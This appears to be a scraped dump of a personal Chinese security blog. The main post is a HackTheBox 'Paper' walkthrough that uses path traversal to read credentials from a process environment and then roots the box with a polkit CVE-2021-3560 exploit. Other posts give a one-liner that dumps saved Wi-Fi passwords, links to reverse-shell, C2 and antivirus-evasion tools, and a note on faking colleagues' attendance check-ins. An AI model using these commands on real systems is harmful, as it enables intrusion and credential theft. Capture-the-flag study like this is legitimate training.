53/tcp open domain Simple DNS Plus 88/tcp open kerberos-sec Microsoft Windows Kerberos (server time: 2022-04-01 18:30:18Z) 135/tcp open msrpc Microsoft Windows RPC 139/tcp open netbios-ssn Microsoft Windows netbios-ssn 389/tcp open ldap Microsoft Windows Active Directory LDAP (Domain: timelapse.","title":"HTB_Timelapse"},{"content":"第一次玩htb，感觉还不错。\nhttps://www.hackthebox.com/\n1.准备工作 配一下openvpn mac，windows\n可以直接用客户端打开\nlinux\nsudo openvpn lab_lker.ovpn 2.user.txt 网上教程很多，就不细说了。\n┌──(kali㉿kali)-[~/kali] └─$ nmap -sV 10.10.11.143 1 ⚙ Starting Nmap 7.91 ( https://nmap.org ) at 2022-06-13 01:23 EDT Nmap scan report for office.paper (10.10.11.143) Host is up (0.23s latency). Not shown: 997 filtered ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.0 (protocol 2.0) 80/tcp open http Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9) 443/tcp open ssl/http Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9) Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 37.73 seconds ┌──(kali㉿kali)-[~/kali] └─$ curl -I http://10.10.11.143/ 1 ⚙ HTTP/1.1 403 Forbidden Date: Mon, 13 Jun 2022 05:27:41 GMT Server: Apache/2.4.37 (centos) OpenSSL/1.1.1k mod_fcgid/2.3.9 X-Backend-Server: office.paper Last-Modified: Sun, 27 Jun 2021 23:47:13 GMT ETag: \u0026#34;30c0b-5c5c7fdeec240\u0026#34; Accept-Ranges: bytes Content-Length: 199691 Content-Type: text/html; charset=UTF-8 发现存在office.paper，配置hosts访问发现是一个wordpress\ntips\twordpress草稿未授权\nhttps://www.exploit-db.com/exploits/47690\nhttp://office.paper/?static=1\n发现新子域\nhttp://chat.office.paper/register/8qozr226AhkCHZdyY\n注册然后会被拉入一个群里面，翻聊天记录发现一个机器人的使用方法，可以查看文件，存在LFI。\n私聊它\nrecyclops file test.txt --- cat: /home/dwight/sales/test.txt: No such file or directory --- recyclops file ../../../proc/self/environ\t#查看程序运行时的环境变量 --- \u0026lt;!=====Contents of file ../../../proc/self/environ=====\u0026gt; RESPOND_TO_EDITED=trueROCKETCHAT_USER=recyclopsLANG=en_US.UTF-8OLDPWD=/home/dwight/hubotROCKETCHAT_URL=http://127.0.0.1:48320ROCKETCHAT_USESSL=falseXDG_SESSION_ID=1USER=dwightRESPOND_TO_DM=truePWD=/home/dwight/hubotHOME=/home/dwightPORT=8000ROCKETCHAT_PASSWORD=Queenofblad3s!23SHELL=/bin/shSHLVL=4BIND_ADDRESS=127.0.0.1LOGNAME=dwightDBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1004/busXDG_RUNTIME_DIR=/run/user/1004PATH=/home/dwight/hubot/node_modules/coffeescript/bin:node_modules/.bin:node_modules/hubot/node_modules/.bin:/usr/bin:/bin_=/usr/bin/cat \u0026lt;!=====End of file ../../../proc/self/environ=====\u0026gt; 拿到user和passwd\ndwight:Queenofblad3s!23\n查看passwd文件发现存在dwight用户，22端口也开放，ssh直接连。\n家目录下存在user.txt\n3.root.txt 提权\nCVE-2021-3560\nhttps://github.com/RicterZ/CVE-2021-3560-Authentication-Agent\nmac交叉编译，sftp上传直接提。\nCGO_ENABLED=0 GOOS=linux GOARCH=amd64 go build [dwight@paper ~]$ ./CVE-2021-3560 pwnkit.service === polkit CVE-2021-3560 exploit - RicterZ @ 360 Noah Lab === pid-623821 - [*] Registering PolicyKit authentication agent ... pid-623821 - [*] Authentication agent main loop running ... pid-623825 - [*] Registering PolicyKit authentication agent ... pid-623829 - [*] Registering PolicyKit authentication agent ... pid-623825 - [*] Authentication agent main loop running ... pid-623829 - [*] Authentication agent main loop running ... pid-623821 - [*] Starting systemd service \u0026#39;pwnkit.service\u0026#39; ... pid-623825 - [*] Enabling systemd unit file \u0026#39;/home/dwight/pwnkit.service\u0026#39; ... pid-623829 - [*] Reloading systemd daemon ... pid-623821 - [+] Received authentication request for action: \u0026#39;org.freedesktop.systemd1.manage-units\u0026#39; pid-623821 - [*] Cookie: 7-223b7416729388670f2d6b10c1245fa2-1-29e7c9e01426331bc08d1cfb4799e22c pid-623825 - [+] Received authentication request for action: \u0026#39;org.freedesktop.systemd1.manage-unit-files\u0026#39; pid-623825 - [*] Cookie: 8-620bd6d39fc68a11ba8e18f299d33621-1-1d92cbcd674e600750d75bc58c61eace pid-623829 - [+] Received authentication request for action: \u0026#39;org.freedesktop.systemd1.reload-daemon\u0026#39; pid-623829 - [*] Cookie: 9-de0cc06fa1f804c42f063371eadc237a-1-66d101ec1e5de8a6f2402906cd2ba04f pid-623817 - [+] File exists, popping root shell ... pwned-4.4# id uid=1004(dwight) gid=1004(dwight) euid=0(root) egid=0(root) groups=0(root),1004(dwight) pwned-4.4# cat /root/root.txt d8d5bbdcaf45684c13c995a3bc514ea0 4.tips 1.注意服务器返回的X-Backend-Server host碰撞来发现隐藏资产。\nhttps://github.com/pmiaowu/HostCollision/\nhttps://mp.weixin.qq.com/s/uH40OJ4ev0rpuzDLMn7x-A\nC:\\dayu\\tools\\HostCollision\u0026gt;java -jar HostCollision.jar =======================基 本 信 息======================= 版本: 2.2.6 下载地址: https://github.com/pmiaowu/HostCollision 请尽情享用本程序吧 ヾ(≧▽≦*)o =======================建 立 线 程 池======================= 线程 1 开始运行 =======================开 始 碰 撞======================= 当前进度 1/6: [████████] 16.67% 协议:http://, ip:10.10.11.143, host:test.paper 匹配失败-2 当前进度 2/6: [████████████████] 33.33% 协议:http://, ip:10.10.11.143, host:office.paper, title:Blunder Tiffin Inc. \u0026amp;#8211; The best paper company in the electric-city Scranton!, 匹配成功的数据包大小:23701, 状态码:200 匹配成功 当前进度 3/6: [█████████████████████████] 50% 协议:http://, ip:10.10.11.143, host:chat.office.paper, title:chat.paper.htb, 匹配成功的数据包大小:223163, 状态码:200 匹配成功 当前进度 4/6: [█████████████████████████████████] 66.67% 协议:https://, ip:10.10.11.143, host:test.paper 匹配失败-2 当前进度 5/6: [█████████████████████████████████████████] 83.33% 协议:https://, ip:10.10.11.143, host:office.paper 匹配失败-2 当前进度 6/6: [██████████████████████████████████████████████████] 100% 协议:https://, ip:10.10.11.143, host:chat.office.paper 匹配失败-2 ====================碰 撞 成 功 列 表==================== 协议:http://, ip:10.10.11.143, host:office.paper, title:Blunder Tiffin Inc. \u0026amp;#8211; The best paper company in the electric-city Scranton!, 匹配成功的数据包大小:23701, 状态码:200 匹配成功 协议:http://, ip:10.10.11.143, host:chat.office.paper, title:chat.paper.htb, 匹配成功的数据包大小:223163, 状态码:200 匹配成功 执行完毕 ヾ(≧▽≦*)o 程序安全退出 :) 2./proc/self/environ https://access.redhat.com/documentation/en-us/red_hat_enterprise_linux/5/html/deployment_guide/s1-proc-directories\n","permalink":"https://killdayu.com/posts/htb_paper/","summary":"第一次玩htb，感觉还不错。\nhttps://www.hackthebox.com/\n1.准备工作 配一下openvpn mac，windows\n可以直接用客户端打开\nlinux\nsudo openvpn lab_lker.ovpn 2.user.txt 网上教程很多，就不细说了。\n┌──(kali㉿kali)-[~/kali] └─$ nmap -sV 10.10.11.143 1 ⚙ Starting Nmap 7.91 ( https://nmap.org ) at 2022-06-13 01:23 EDT Nmap scan report for office.paper (10.10.11.143) Host is up (0.23s latency). Not shown: 997 filtered ports PORT STATE SERVICE VERSION 22/tcp open ssh OpenSSH 8.0 (protocol 2.0) 80/tcp open http Apache httpd 2.4.37 ((centos) OpenSSL/1.1.1k mod_fcgid/2.3.9) 443/tcp open ssl/http Apache httpd 2.","title":"HTB_Paper"},{"content":"梦 昨晚10点睡到早上十点，做了一个超长的梦，被tm一个贩毒集团的一直追杀，梦里差点被吓死。\nGithub 起床惯例，刷GitHub\n提权，Linux\nhttps://github.com/tr3ee/CVE-2022-23222 此漏洞影响Linux Kernel 5.8 - 5.16，并在5.10.92 / 5.15.15 / 5.16.1中修复。 https://github.com/RicterZ/CVE-2021-3560-Authentication-Agent polkit 0.113引入 取证，微信解密\nhttps://github.com/x1hy9/WeChatUserDB https://www.52pojie.cn/thread-1084703-1-1.html https://github.com/Mr0x01/WXDBDecrypt.NET IPFS\nhttps://ipfs.io/ 去中心化文件系统，可匿名发布信息和文件 漏洞库\nhttps://github.com/Threekiii/Vulnerability-Wiki Windows c2\nhttps://github.com/MythicAgents/Apollo Microsoft Office Word 远程执行代码\nhttps://github.com/lockedbyte/CVE-2021-40444 python实现的反向shell\nhttps://github.com/t0thkr1s/revshellgen 感觉没啥用，推荐 https://github.com/WangYihang/Platypus 交互式shell /usr/bin/script -qc /bin/bash go web框架\nhttps://github.com/flamego/flamego 域名预测\nhttps://github.com/LandGrey/domainNamePredictor 红队知识仓库 *\nhttps://github.com/Threekiii/Awesome-Redteam https://github.com/pen4uin/awesome-pentest-note http://wiki.tidesec.com/ https://github.com/guchangan1/All-Defense-Tool 免杀\nhttps://github.com/Threekiii/Awesome-Redteam/blob/master/tips/内网渗透-免杀.md https://github.com/TideSec/BypassAntiVirus tips\nhttps://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/攻防渗透常用命令速查.md exp\nhttps://github.com/Threekiii/Awesome-Exploit c2服务器流量隐匿\nhttps://github.com/wikiZ/RedGuard tip\npowershell history %userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt wifi password for /f \u0026#34;skip=9 tokens=1,2 delims=:\u0026#34; %i in (\u0026#39;netsh wlan show profiles\u0026#39;) do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear Ctf tools\nhttps://github.com/UniiemStudio/CTFever exp\nhttps://github.com/zangcc/Aazhen-v3.1 https://github.com/Weik1/Artillery https://github.com/awake1t/Awesome-hacking-tools 暂时就这样吧\n","permalink":"https://killdayu.com/posts/2022.6.10/","summary":"梦 昨晚10点睡到早上十点，做了一个超长的梦，被tm一个贩毒集团的一直追杀，梦里差点被吓死。\nGithub 起床惯例，刷GitHub\n提权，Linux\nhttps://github.com/tr3ee/CVE-2022-23222 此漏洞影响Linux Kernel 5.8 - 5.16，并在5.10.92 / 5.15.15 / 5.16.1中修复。 https://github.com/RicterZ/CVE-2021-3560-Authentication-Agent polkit 0.113引入 取证，微信解密\nhttps://github.com/x1hy9/WeChatUserDB https://www.52pojie.cn/thread-1084703-1-1.html https://github.com/Mr0x01/WXDBDecrypt.NET IPFS\nhttps://ipfs.io/ 去中心化文件系统，可匿名发布信息和文件 漏洞库\nhttps://github.com/Threekiii/Vulnerability-Wiki Windows c2\nhttps://github.com/MythicAgents/Apollo Microsoft Office Word 远程执行代码\nhttps://github.com/lockedbyte/CVE-2021-40444 python实现的反向shell\nhttps://github.com/t0thkr1s/revshellgen 感觉没啥用，推荐 https://github.com/WangYihang/Platypus 交互式shell /usr/bin/script -qc /bin/bash go web框架\nhttps://github.com/flamego/flamego 域名预测\nhttps://github.com/LandGrey/domainNamePredictor 红队知识仓库 *\nhttps://github.com/Threekiii/Awesome-Redteam https://github.com/pen4uin/awesome-pentest-note http://wiki.tidesec.com/ https://github.com/guchangan1/All-Defense-Tool 免杀\nhttps://github.com/Threekiii/Awesome-Redteam/blob/master/tips/内网渗透-免杀.md https://github.com/TideSec/BypassAntiVirus tips\nhttps://github.com/Threekiii/Awesome-Redteam/blob/master/cheatsheets/攻防渗透常用命令速查.md exp\nhttps://github.com/Threekiii/Awesome-Exploit c2服务器流量隐匿\nhttps://github.com/wikiZ/RedGuard tip\npowershell history %userprofile%\\AppData\\Roaming\\Microsoft\\Windows\\PowerShell\\PSReadline\\ConsoleHost_history.txt wifi password for /f \u0026#34;skip=9 tokens=1,2 delims=:\u0026#34; %i in (\u0026#39;netsh wlan show profiles\u0026#39;) do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear Ctf tools","title":"2022.6.10"},{"content":"钉钉+某助手配合某框架的通用化在没root的手机上实现远程打卡😋（之前都没想到弄），这样我就不用每天9点起床手动帮别人打卡了。还能配合gayhub上开源的auto. js某脚本实现自动打卡。\n","permalink":"https://killdayu.com/posts/dingtalk_location/","summary":"钉钉+某助手配合某框架的通用化在没root的手机上实现远程打卡😋（之前都没想到弄），这样我就不用每天9点起床手动帮别人打卡了。还能配合gayhub上开源的auto. js某脚本实现自动打卡。","title":"Dingtalk_Location"},{"content":"我草这个有点🐮，Google翻译看着有点头疼，原理大概就是浏览器会缓存网站的favicon.ico，然后缓存到的favicon.ico再次刷新网页的时候不会重新请求。服务器会在首次访问时创建多个路由（这样才能实现区分多个不同客户端），然后随机将一些路由的favicon.ico设置成200，同时按照路由的favicon.ico生成一个id。客户端再次刷新时由于缓存了某些路由之前的favicon.ico，就只会去请求之前404的favicon.ico，服务器就能得到404的favicon.ico请求然后还原出客户端的id。相当于实现了一个cookie，其实id的实习都源于浏览器的请求，所以代理这些网络层面的都隐藏不了。但是我试了下最新的Chrome失效了😋。但是貌似之前的Firefox中招了，Tor就是魔改的Firefox，也不知道有没有继承缓存favicon.ico这个特性😋，暗网不再暗网😋。一切特征都是supercookie😋。 https://github.com/jonasstrehle/supercookie https://supercookie.me/workwise\n","permalink":"https://killdayu.com/posts/supercookie/","summary":"我草这个有点🐮，Google翻译看着有点头疼，原理大概就是浏览器会缓存网站的favicon.ico，然后缓存到的favicon.ico再次刷新网页的时候不会重新请求。服务器会在首次访问时创建多个路由（这样才能实现区分多个不同客户端），然后随机将一些路由的favicon.ico设置成200，同时按照路由的favicon.ico生成一个id。客户端再次刷新时由于缓存了某些路由之前的favicon.ico，就只会去请求之前404的favicon.ico，服务器就能得到404的favicon.ico请求然后还原出客户端的id。相当于实现了一个cookie，其实id的实习都源于浏览器的请求，所以代理这些网络层面的都隐藏不了。但是我试了下最新的Chrome失效了😋。但是貌似之前的Firefox中招了，Tor就是魔改的Firefox，也不知道有没有继承缓存favicon.ico这个特性😋，暗网不再暗网😋。一切特征都是supercookie😋。 https://github.com/jonasstrehle/supercookie https://supercookie.me/workwise","title":"Supercookie"},{"content":"好久不见，冒个泡，我只是废物。\n","permalink":"https://killdayu.com/posts/2022.6.3/","summary":"好久不见，冒个泡，我只是废物。","title":"2022.6.3"},{"content":"今早6点多才睡，因为手机快没电了。下午竟然1点多就醒了，然后看了下社区微信群，今天核酸下午4点就停了，之前明明是晚上9点，然后下午5点。。。。然后就不想去了，躺在床上纠结到了3点半，唉还是去吧，不然搞弹窗了又是一堆事，影响我周末躺平。测了下app的抓包，貌似发现了新的tips。凌晨刷知乎刷到了绝命毒师，感觉还不错，今晚开始刷剧。。。\n","permalink":"https://killdayu.com/posts/2022.5.13/","summary":"今早6点多才睡，因为手机快没电了。下午竟然1点多就醒了，然后看了下社区微信群，今天核酸下午4点就停了，之前明明是晚上9点，然后下午5点。。。。然后就不想去了，躺在床上纠结到了3点半，唉还是去吧，不然搞弹窗了又是一堆事，影响我周末躺平。测了下app的抓包，貌似发现了新的tips。凌晨刷知乎刷到了绝命毒师，感觉还不错，今晚开始刷剧。。。","title":"2022.5.13"},{"content":"print(\u0026#34;Hello World!\u0026#34;) ","permalink":"https://killdayu.com/posts/hello_world/","summary":"print(\u0026#34;Hello World!\u0026#34;) ","title":"Hello_World"}]